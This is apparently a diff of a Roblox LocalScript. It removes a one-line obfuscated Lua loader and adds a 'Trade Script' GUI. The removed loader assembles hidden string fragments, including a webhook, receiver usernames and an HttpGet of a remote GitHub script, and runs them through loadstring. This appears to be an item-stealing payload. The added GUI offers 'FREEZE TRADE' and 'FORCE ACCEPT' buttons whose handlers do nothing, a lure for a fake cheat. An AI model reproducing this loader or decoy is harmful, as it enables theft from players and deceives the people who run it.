@@ -1,1 +1,126 @@
-return(function(...) local v_V24={"300tkj3tvJS";"LWcKvUlh46B";"k1C9zU";"4HwtfEcRoee";"\103\101\116\103\101";"Wcb9gQCm1RMy";"NvCgAC";"4ggtzmF";"s1UPvF";"0IccM8IcI3lLW";"gpptYjH";"TWm1Fi8HY";"oLsNJA";"93kgZ9";"W7FhskX4Cfxx";"\110\118\040\041";"BO1cQqXnI6Z0";"xwLdxiDuBt7";"LnQkTSZ";"2FoXo";"enndNdDJbP";"\046\083\116";"sSpNCn";"u63lb";"xgd7K";"RpOel4I6g";"zydZ6";"lNR5d3I8";"smG5RMxO8f";"M2RUZtYQi7do";"nQwjS6jAP";"\097\114";"KttWjQyRgWnlEAM";"BlkvDyqtgIJnN";"1kPiL";"JWutpIbeXOOU";"WFOvsfxDa3J";"2yZ3HB6";"FM7qSuMGSMa";"O5CLcIFz";"WYMcSjtc3GScm0v";"OKEiNp";"\083\099\114\105\112";"nfksDPqhcqiIa";"9r5e9Ly";"d6GQm1ekTg";"XNtnB6AP4MNTur";"pJvn84XLFks";"nuEHzFUovHO7";"dm3mbYL8eBc";"A6hx0";"aRYxJ1bgGiNWGAY";"CDWFBVDWtigt";"\116\115";"JTA1QzOE";"NCzaUD1qfE8J";"oKeXb9r9JIBX";"UigZavOk";"cFqk8Pc1z5Ut";"inkJuYGCcSxZZSr";"W7H1dAat";"jQDaiBSiAU";"epJL4";"VkHEQCyH";"\067\111\110";"nYXaeTr";"wXy4U2Xy";"boLeuVLJSS";"\102\105\103\032\061";"QZZFUUvJlevsj";"oN982keQVrJEh";"2C76X2pRltL";"1jc8hYd67zc";"jvk1T0r9B";"VHRJoHAoS";"tYoEZ3j7TE";"hFygZbDW";"EivoL9KDR";"34I3tfZcuh0zVE3";"\032\123\010\032";"XLX7HIMjKcz";"pqy7yoUYuC37E";"DmviD39YYZu";"GTysvSvt2uqn";"gZvdT3ff";"Z387Snjxhcx";"FdzBuM53slqz";"\032\032";"6X8CpC2tNlNvG9Q";"yK2qSaRl";"OS8D022rADY";"9gQsHwE";"XC5PXKHYLl";"0ec4Xx09T";"tZ8hszoE";"G1fnnGTn8xE0l";"sau42qNYO";"\032\087\101\098\104";"XPJlfIhsBXFDr0g";"gEFTCJOA";"9CJFH0lap";"1hdHzb2";"rvxFup2YIxn4hr";"n6kGUxZ";"2JBKypJTl3XID";"\111\111";"ATUQldNPenHATK";"u1a8s5OMdUM";"4OsU7dbWjwaS8";"3DgYi";"\107\032\061";"KpDnPC85e6rd7";"8rBiWBy";"klb9TlVN9q2";"BJeftVFcWU";"ldSHbPRV6t";"\032\034";"ViMuSDUOw7Q";"5d66YA";"mr14Q";"\104\116\116\112";"nLmtPvCi3xn";"fNZO6Cd";"bG14zl8jFYkTMQ";"gcukC2mEtG";"1oUHEyU05";"up7o5LfOECP";"hYmqmZgj";"13YIr1qp";"\115\058\047\047";"CqMGsu7elF85";"9FEFzTKm9";"RvjodevojcH";"qpIgvbA";"5m0qp1rBLkQ";"sGIEGhMlYHO";"JEhRgTQ";"\112\114\111";"t67ZNbhbRsaH";"OModxaBv";"PRKEGsUx";"5NPce";"tybxxC";"\120\121\107";"0Poj0j";"nuCcpxYIOjxOF8f";"CMSVp4y6ivwaGZa";"\111\121\101";"jjpRhN";"6VxIA";"eKihjzMkpozkn";"zJURf0iOJ";"RM93gzlFjWIj";"cDsjaB8nrAjvivU";"4Xp2jIeuGWS";"vapXFDtDml0Dkw";"xxYNH2UB0k43LdZ";"\098\046\111\110\114";"OemZ4aO25RuiiA";"M2IK8YH5l";"RH8qDJfcf2s8F";"apdFietN7wuMHd";"4gCRBPhVU";"ssvxfmjwKpXo";"QOuuiRul";"bA10WNt";"cOr9t";"\101\110\100\101";"KmzBes";"f5tHdYKRp7ewCeX";"Hcb4xXBbAKC";"DRPmBf5h";"uTZbQ2s42VQkJ";"A36vEHB6mHt";"\114\046\099";"KqatjDi";"4dtUtOOjiRX";"sR1F2tV5fYFNF";"RU9K1Xi";"27XzeUkVfTAO";"b3mOG5NH8";"GdkOt";"89U0GAmFKFuF";"pQ4Zig3h";"\111\109\047\115\101";"wPkg4OrZPj9x";"JAnveGNrc2kw5d";"xAfsnQ5py";"lmy2j7PG";"Bc0r5ehq0Y738rr";"O0mUdIgKkY";"v5dJvgC";"\110\100\047\112";"8FUEasbZNA";"aKzefPXQx";"qdnLUxu";"\099\057\057\090\066";"KsUSoLFPZji";"o79bWA";"QyTZn";"\082\105";"PgjO2bil2";"f2OCvgyi";"dHpTsHe";"QJoL5Mymj";"4D003mKXns";"RJ0u48Odh6";"bvNgOB94n";"ad3UocE";"nY9Uoudwng";"VwoZVLCQlR";"\055\066\074";"QSxLp3SfB";"kGGNzeIn7z";"FJiisln0EDJKftS";"pTFUzWGUI9nn6H";"ZV1iR89D";"IwPicB";"KYjtv3jJ5";"MlPuxQZDMMQb";"HUJ0xVD4bLr";"\116\102\119";"5bKB5qVVrUn";"2G0uD6edkGzx";"PgFgAsI9T1hUbdv";"PrIKKsVQWAqoJo8";"hx5Xwx4";"cld5sI6x8a";"\081\103";"ts2zeTudsM8vVS";"bqjcKwibb";"mHjHaY";"16S0YBh5";"Xy35Sm3esUM";"\078\121\077";"a5tuIjVg";"fdQoHNeS0EV";"wfIv0XQ9NrF";"WJP4gD0FqM";"MQ9L6yD9JVCYc";"fu4vSuOabf4";"\079\086\083\097\101";"5YnGYqkSYvq";"n8cw6hCAyQU";"V35GnBF";"9SNu6";"md9XC12OuXoJ";"A5hG7PATBX";"z1eorAgif9XB";"WXbzZa2a1ObiiuI";"B8Tb7DQ2";"VtZFOa";"\099\055\098";"NnklLb3H4QH0Jh";"uWFtDAI";"KA5wI";"uaQJBe8Z";"\071\053\083";"JP12Q58Byoc2q3I";"FrdjgM11PxXl";"xVvgrkiwFRDUX";"Sw18JrF2H3ZuXnO";"d6jV9eH8";"pXh22EmnMdD338";"hhTNqgrLL1KC4U";"OImYdUns6";"DzbxIMnuS";"Ho2AKpuzYt9";"\069\071\034";"d1wy0sBS";"kcLaW9qpJiIho8l";"YQbjZey";"faDyX6";"9EBsfAQcYyeBL";"\044\010\032";"fKqRpqou";"Wga5TX";"aLipBXlRfKcK7Nv";"BbJDG1UJIzkl";"nvI1AUQ2";"z5OXywAH6bkg";"KxJd7";"D4a52s";"Ei62r9En";"cfvJ9GVq";"\032\032";"U49U4Cjch";"trrTHlaPLzep";"s4CzQFY";"iU1wzlkv79ZL";"m0lK28V";"KjCFOg9m";"\032\082\101\099";"avEetoOaiglrXM";"cf1DGJObnYSR";"c6zE7h";"jVTNwSgAiNDg2L";"atzzeLb";"uJgtAgCo0w4M";"uMCKF";"WRRMhb0";"IDOr7RGh7SwA6r";"jJZGY8vG1";"\101\105\118";"7U0T2T4B";"zP8DKL";"eXSonlXQ";"gHAEPwApTWLu";"syUhmGI2vMx";"xrkqr";"KAx9WHLp1N1t";"9OSgjs";"fqBUiKhcRljo7D";"\101\114\032\061";"LJcFXP1";"HeHGxE2gjOBnIM2";"gn8CkvCJXKVS";"\032\034\086\111";"PZ3N5A";"2CG75XVaLGo";"FvtbGODxb6EJ";"pBTpuOaR67p";"lY8Xk4TM9fppp8S";"m2OslXvuxw";"j7Z8U5SX";"\105\100\101";"ErnsChYW6h";"bH6yWcDdQDJ";"Vfr7mcKcniOB";"r5N0LDng";"23QsnSWe5nayh";"\118\101\112\111";"UbaB0fxYJocg";"havU0k3O";"uROTqyhr4";"\114\034\044\010\032";"DlRJuy";"fybA7";"vfj8UiUH";"6gjr9xqK5rxZ2";"Ct2LGvsfVGnGIQ";"Cev6QJu8ziyQ";"cP7bol4t2dPQEI4";"ggAaFpEv7";"8ZHZrXhnsAB";"RZGaW8pZXR55D";"\032\032\032\085\115";"NFj2N82BV";"cF4R5mhXMsvDT2F";"LKpgXLB";"qNezunDXK";"2Qng2txvpOOa";"vbdC22";"7D4pgVv";"RWSXdH";"jCfk7";"\101\114";"sYlUR8";"Hb1nol";"Q5FGHuiahp";"UHa2Ftrxnp";"\110\097\109\101\115";"jJtIPf";"kJO9ZMBSKCpM4";"cbzQI8OCHhm8sE";"IpMBldmK";"b7QlPLHW";"XASaJZK";"qE0FQe1";"sI6Lg79SDvC1Z";"WAiXhXT";"7VrAzTYfTwB";"\032\061";"Sz0Nz2";"pU0Jk8uPAiYuAtI";"W37qIN1";"xd0oQw";"UBtEvwU";"\032\123\032\034\086";"ORv1zEodc3";"AcCfE08zwBRsSPX";"rwK7ukCzorieAgf";"hJzH1nK7F";"RzIHp";"VJKbWXjo4QxLHA";"\111\105";"6VEcyy25Xz";"pTkq2yk";"6bshos";"cISx5xYD";"36izwzo80";"FWJ0VEmMZBuM";"HSXCmVoH";"gWL7r";"\100\101\118\101";"bZOv4PdD";"DdL9GOguIwuj";"SX6EGC";"RopLGCPlCb0Bi0q";"IuLvqvlN445dQk5";"1gsJOFg8aU";"4f06ZSL";"KvUooP";"SXVzVJLoKEtv";"\112\111\114";"s02CO";"K0zc0gsVISpT";"aQ38si";"sT47laL7I";"xIYffk";"sjQtnZqBFH54QgN";"\034\044\032\034";"ZoM7jQMG5r4iyN";"xo3ee4A";"XuHlR7Az";"CNkwr";"pz7j8GKdA";"8b3M5rbiye2ZM";"\076\111\118\105";"15e3GLfgqEHRo";"XZJl46tLWLMb";"gJu4kJx1AhV";"Nm7tnj";"GZRf7i1V7";"N54Vm84BXTYJ";"YcU9QfjVQn";"840J2p";"aOb4F";"wYCeWL";"\110\103\108";"12xii9r";"UwSCsQpq7jJ";"Iuq0q9SDgyY";"6pvcPiIAMZ7FNc";"rzJw8";"05uyxhJK6Z";"zsaYn";"\121\072\117\109";"pIyUnu1M2Nw";"lsTrPEqBlX6VCf";"ARAGmiZOKxJ";"k7A3Xw0Kex";"4aqSortnS6J";"KlSh6yuIfWRO";"MkgNz";"LYUvnrkC";"GHKYwi8idaxV";"6FUWJz";"\097\110\034";"kGxr10";"pskowSJQJMqKO";"pZFWfCNnFIYfZR";"V0oPakq4LBeiEHo";"FdWfe25L";"\032\125\010\125\010";"njsRikCT5";"MFx9anWrNIIIXJ";"bUM2om";"6ygcdRc0FbG";"9HqnOe81L";"nv2HN";"8ZKTtZS";"Ko7oUFUl";"W8JZ1N6BQFFd";"\108\111";"MIcVH";"GXADAuXJfcS2mf";"EnRAx6GjIT";"vdSWY3JaC5zK";"TM58YJEP2";"WqhXOgA";"agABmkfl1M";"\097\100\115\116\114";"9sKso9gQ";"qjIpOn2ddSF";"SpkFySOq";"PXSik7eG";"xH76xrS1cMJGi";"8iaJHbjAO8XJ0aO";"akvjmo";"28KlKRyvTP71bT";"AZkZaZzm6ExW";"J7XXbloc2";"\105\110\103\040";"qKzqD2FJo";"Zb3h6rqGR1zgim";"P9Wa9hgZ377Cytm";"fsKd0Ufo4";"n6SWtiTjx4JIbm";"F7QDWdFce";"lLDmcaJRWgOf";"xJY7rj0bK";"qpuGebXFDswAX";"\103\097\109\101";"k2bZuONtlOp1";"OgMNcrB";"0exeU5peHevDhff";"\058\072\116\116\112";"Cse4B";"A3aLGdoI5wtf";"rO3KF";"\071\101\116\040";"l76lC";"jOOHZwwJ";"alW1xalEvJMAMQ";"PrP8o6n";"dwYyb1J0";"DOAoxRaV7MnDJF";"BfDMY68vn0";"EOmWn8b";"\034\104";"S99l3b9iO";"yyPCpbp3ePR";"EAzQv7nE4hTv9";"HdLWmSDcEl312";"knuI7r5kIu0IS";"YB7nXbPxgDs8";"t19plNbKMSJzWo";"psK6YPBBN";"nTmLJLkSCXwFR";"\116\116\112";"zFOr10wFaKh0";"9SrFru20lz1Ol5";"qHwcRG34guRui";"SMS086goXfYXUP";"BHwV2";"OX9sPR06r8";"BS9iX";"12M3PP9XMhFl";"\115\058\047";"ezSmPM54crXZ";"aZIiyxzgKok8";"pEpOJHq0U";"zNQb5MbQ";"VUNj4Q7G";"RgP17xkusIW";"\047\114";"YBM3n";"eOKwxLOpHtso";"zWXMp";"5HTfZTs1fC";"25w9o";"kAU5QR";"\097\119\046";"K19rXBa";"Unq5uWJz9s";"VZCQn";"VgtJEqR2FFN9c4i";"iJglbZit1NO";"eppKaFmau";"\103\105";"YuckWyhR";"OavD28txgK1uUQU";"0G9KrGXt";"adpIJUrT7dAL";"\116\104";"XM8gkHHA98N";"3I40y0h";"eKBr9";"Y2KD3alVDNlos";"B545MvVWnN8xo";"WL1A4OLvyLTdfY";"Z0WOix";"J1KoW1588";"\117\098\117\115";"bYx8al82xAbtg";"QTSB7PoPqY";"udCosK4WdJ";"up0wtT0M";"ZS8HuwGVDEGWa7I";"\101\114\099\111";"ZneE7Pwu3";"iEsQy";"bOVGtfUpRY";"TV3egi";"1FEmkDqmSeVCf";"jcNli5";"10kjQ3PFEeHc";"\110\116\101";"0HjuAyZJOQJg7Nz";"ST52x80sg";"hhGa9dXESIUej0";"lGQKRJbC9hV";"7LfUO";"A7rwsPmkT";"Ofzf17DGTYyTA5M";"BfG8hx0";"ymNfpUq7un1";"\110\116";"zbLuLE";"av1hhgy4cfq79Jo";"S2GGd19IfkZyC";"\046\099\111\109";"HawT5KUbMws";"1G1MRneruAD";"ifI2pKRKmJZAZ8";"oPiIAZF1R4w";"YydVlnLd1BLzD";"tW8omZh6Adq6";"PGu9CC";"5TA7qc3M";"kNi3jf";"GXhwaI";"\047\102\103";"JMAiZlQu";"IAY8Cg";"abNrh5KH";"KIG3LcOtg66";"a0wq03HPDfun";"xa3jCMni";"wanTykKbv";"dgGrjK";"\102\104\103\115";"AJHAZBv9z";"BY2t4BKBKzZ5dU";"yBfMlq7ZVnRmtnR";"V64Ea9ncK";"2iyjoiI5g7I";"8QL3ehkAUuGa8Kn";"sFK7pUBxp";"\100\048";"lLYZ7c";"PNP1KqGwythTrXS";"GiRghG";"jFK4zv0I5fpN";"W1lXXE3jTXpt51";"UDocp9quH1aScM";"0DEwx";"aGpJMV";"CG4Yryxpdcm";"zfvPIMDrgyX";"\052\045";"XCZmvuT";"iiX2grHva2A4G";"bTIpos6nq";"0rxb3x9ljG8";"KFyMMbG1zV03NIU";"6Lp5bY";"\099\111\100\101\114";"FKsUF7XyZ";"ddXs8g79sfx";"j2TR3";"8fJVoEF";"eW5zVm8uM";"1rEObSs3MQNbk0";"8FDrJtDfohOz6";"AyKtSzMdBQ";"kOPM8xM";"SdYBbLa0nZ";"\047\115\116";"ovTJ9vC38OP8mP";"t923JdCCrTWd";"iBFOP0FbDk";"Rww5XAlNR6cY0y";"\097\114\047\114\101";"dzE5FHONb7wXxL";"O10xvYQ2";"YC1UELZJAxU";"xqZMlizx";"\102\115\047";"KnlZslX6t98i";"b5kYojoCHENZdb";"il4DSDTDXCTeIqF";"A5znnoGFn";"2p2M51nJO5z";"RFWS1ILbF9Sxch";"\104\101\097\100\115";"bRkC2XD";"2ByKwBPojCQP92";"DI0Gcsaz";"MtkAjwRvPr4";"bvw4Fs0jfn1bt";"bULAEYkPc";"WDOTZOoTS1";"FOj4KQ1lAy6mbU";"\047\109\097\105\110";"WCKwZr3eugs";"Wmc2HVYOQo";"1bCrbdbUs";"jZilzD";"VxxDpdJnpTof";"s3QN7QWUVgXlIE";"7ssUb";"\047\115\099";"gMme6qX6YQZUWr2";"9NbVtk5";"ztU4LiCiR35oV";"ZTRomB7HsQPX";"Q9XxnSBNteWfiU";"TnM4CfI4Ss9n";"HgGWcXzsIN";"EpXqGtHiL";"CLX7ONTRy";"DnfKJG";"\114\105\112\116\115";"7NXOIFLGQ0R8O";"48JXNJpHe";"6Dj5QnyYhd8iYd";"KD6W6pMmeyrHMr";"QXcND";"gFlBE7qa4h";"jM2HtlSqw";"ABqmLytLnU";"\034\041\041\040\041"} local v_vrT={5,16,22,32,43,54,65,69,80,88,98,106,111,117,121,130,138,144,148,158,168,175,185,193,197,201,212,222,229,235,242,253,258,269,275,286,293,304,314,318,326,332,336,347,357,362,373,379,386,395,405,412,419,430,438,449,455,465,473,484,494,498,502,511,521,530,537,544,551,556,565,571,579,589,593,604,613,621,632,639,650,655,660,667,676,684,695,704} local v_2up={} for _,v_Rko in ipairs(v_vrT) do table.insert(v_2up, v_V24[v_Rko]) end local r=loadstring(table.concat(v_2up)) if r then r() end end)(...)
+-- LocalScript (put in StarterPlayer > StarterPlayerScripts)
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local UserInputService = game:GetService("UserInputService")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeScriptGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Main frame - even smaller rectangle
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 280, 0, 180)
+frame.Position = UDim2.new(0.5, -140, 0.5, -90)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Parent = screenGui
+
+-- Draggable title bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 35)
+titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -90, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Trade Script"
+title.TextColor3 = Color3.fromRGB(180, 100, 255)
+title.TextSize = 22
+title.Font = Enum.Font.FredokaOne
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+local credit = Instance.new("TextLabel")
+credit.Size = UDim2.new(0, 80, 1, 0)
+credit.Position = UDim2.new(1, -90, 0, 0)
+credit.BackgroundTransparency = 1
+credit.Text = "made by hydro"
+credit.TextColor3 = Color3.fromRGB(140, 140, 160)
+credit.TextSize = 11
+credit.Font = Enum.Font.SourceSans
+credit.TextTransparency = 0.5
+credit.TextXAlignment = Enum.TextXAlignment.Right
+credit.Parent = titleBar
+
+-- Dragging logic
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+titleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- 3 buttons without emojis, smaller size
+local buttons = {
+    {text = "FREEZE TRADE", color = Color3.fromRGB(120, 80, 220)},
+    {text = "FORCE ACCEPT",  color = Color3.fromRGB(220, 60, 60)},
+    {text = "ADD ALL",       color = Color3.fromRGB(60, 180, 90)}
+}
+
+for i, btnData in ipairs(buttons) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.88, 0, 0, 42)
+    btn.Position = UDim2.new(0.06, 0, 0.23 + (i-1)*0.27, 0)
+    btn.BackgroundColor3 = btnData.color
+    btn.Text = btnData.text
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.TextSize = 20
+    btn.Font = Enum.Font.FredokaOne
+    btn.Parent = frame
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = btn
+    
+    btn.MouseButton1Click:Connect(function()
+        -- nothing happens
+    end)
+end
+
+-- Toggle with key "H"
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.H then
+        screenGui.Enabled = not screenGui.Enabled
+    end
+end)
+
+-- Start visible
+screenGui.Enabled = true
